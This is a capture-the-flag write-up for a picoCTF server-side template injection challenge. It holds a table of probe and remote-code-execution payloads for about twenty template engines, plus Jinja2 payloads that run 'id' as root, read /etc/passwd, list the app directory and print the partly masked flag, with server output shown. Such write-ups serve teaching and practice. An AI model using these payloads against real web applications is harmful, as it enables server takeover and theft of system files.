@@ -1,0 +1,140 @@
+Step 1: Check the hint.
+	hint: server side template injection.
+step 2:
+	Check Engine type according to below table.
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+|        Engine        |                                      Payload                                       |        Output           |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| Jinja2 (Python)      | {{7*7}}                                                                            | 49                      |
+|                      | {{7*'7'}}                                                                          | 7777777                 |
+|                      | {{'a'+'b'}}                                                                        | ab                      |
+|                      | {{config}}                                                                         | Flask config dump       |
+|                      | {{''.__class__}}                                                                   | Object access           |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| Twig (PHP)           | {{7*7}}                                                                            | 49                      |
+|                      | {{_self}}                                                                          | Twig context            |
+|                      | {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}} | RCE                     |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| Freemarker (Java)    | ${7*7}                                                                             | 49                      |
+|                      | <#assign x="freemarker.template.utility.Execute"?new()> ${x("whoami")}             | RCE                     |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| Velocity (Java)      | #set($x=7*7) $x                                                                    | 49                      |
+|                      | #set($str=$class.inspect("java.lang.String").type)                                 | Class access            |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| Handlebars (JS)      | {{7*7}}                                                                            | Literal (safe)          |
+|                      | {{#with "s" as |string|}}{{#with "e"}}{{this.pop}}...{{/with}}{{/with}}            | Prototype pollution     |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| ERB (Ruby)           | <%= 7*7 %>                                                                         | 49                      |
+|                      | <%= system("whoami") %>                                                            | RCE                     |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| Smarty (PHP)         | {7*7}                                                                              | 49 (some versions)      |
+|                      | {php}echo `whoami`;{/php}                                                          | RCE if enabled          |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| Mako (Python)        | ${7*7}                                                                             | 49                      |
+|                      | <% import os %>${os.system('whoami')}                                              | RCE                     |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| Pebble (Java)        | {{7*7}}                                                                            | 49                      |
+|                      | {{someString.replace('a','b')}}                                                    | Method call             |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| AngularJS (JS)       | {{7*7}}                                                                            | 49 (if unsandboxed)     |
+|                      | {{constructor.constructor('alert(1)')()}}                                          | XSS                     |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| Tornado (Python)     | {{7*7}}                                                                            | 49                      |
+|                      | {% import os %}{{os.system('whoami')}}                                             | RCE                     |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| Django Templates     | {{7*7}}                                                                            | "7*7" (no eval)         |
+|                      | {% debug %}                                                                        | Context dump if enabled |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| Thymeleaf (Java)     | ${7*7}                                                                             | 49                      |
+|                      | *{7*7}                                                                             | Alternative syntax      |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| Jade / Pug (JS)      | - var x = 7*7                                                                      | JS eval                 |
+|                      | #{7*7}                                                                             | 49 if enabled           |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| EJS (JS)             | <%= 7*7 %>                                                                         | 49                      |
+|                      | <% require('child_process').exec('whoami') %>                                      | RCE                     |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| Razor (.NET)         | @(7*7)                                                                             | 49                      |
+|                      | @System.Diagnostics.Process.Start("whoami")                                        | RCE                     |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| Groovy (Java)        | ${7*7}                                                                             | 49                      |
+|                      | ${Class.forName("java.lang.Runtime").getRuntime().exec("whoami")}                  | RCE                     |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| Mustache             | {{7*7}}                                                                            | "7*7" (no eval)         |
+|                      | {{{7*7}}}                                                                          | Same                    |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| Vue.js (JS)          | {{7*7}}                                                                            | 49 (if unsandboxed)     |
+|                      | {{_c.constructor('alert(1)')()}}                                                   | XSS                     |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| Spring EL (Java)     | ${7*7}                                                                             | 49                      |
+|                      | ${T(java.lang.Runtime).getRuntime().exec('whoami')}                                | RCE                     |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| Bonus Polyglot       | ${7*7}{{7*7}}<%= 7*7 %>#{7*7}<!--#exec cmd="whoami"-->                             | Multi-engine test       |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+
+
+***After checking we found that the site is made with jinja2 template.
+
+Step 3: Try to execute some commands.
+
+i) {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
+	
+    <!doctype html>
+    <html>
+        <h1 style="font-size:100px;" align="center">
+            uid=0(root) gid=0(root) groups=0(root)
+	    </h1>
+	</html
+	  
+	  
+ii) {{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']['open']('/etc/passwd').read() }}
+	
+	
+    <!doctype html>
+    <html>
+        <h1 style="font-size:100px;" align="center">
+            root:x:0:0:root:/root:/bin/bash
+			daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+			bin:x:2:2:bin:/bin:/usr/sbin/nologin
+			sys:x:3:3:sys:/dev:/usr/sbin/nologin
+			sync:x:4:65534:sync:/bin:/bin/sync
+			games:x:5:60:games:/usr/games:/usr/sbin/nologin
+			man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+			lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+			mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+			news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+			uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+			proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+			www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+			backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+			list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+			irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+			gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+			nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+			_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+	    </h1>
+	</html>
+	   
+	   
+iii) {{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']['__import__']('os').popen('ls -la').read() }}
+ 	
+    <!doctype html>
+    <html>
+        <h1 style="font-size:100px;" align="center">
+			drwxr-xr-x 1 root root   25 May 20 00:34 .
+			drwxr-xr-x 1 root root   23 May 20 00:34 ..
+			drwxr-xr-x 2 root root   32 May 20 00:34 __pycache__
+			-rwxr-xr-x 1 root root 1241 Mar  6 03:27 app.py
+			-rw-r--r-- 1 root root   58 Mar  6 19:44 flag    <!-------------- we got the flag --------------->
+			-rwxr-xr-x 1 root root  268 Mar  6 03:27 requirements.txt
+	    </h1>
+	</html>
+
+
+iv) {{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']['open']('flag').read() }}
+ 
+ 	flag: picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_****_********}
+ 	
+ 	
+ 		
+<!----------Author's message: Give it a try yourself. Happy hacking!----------->
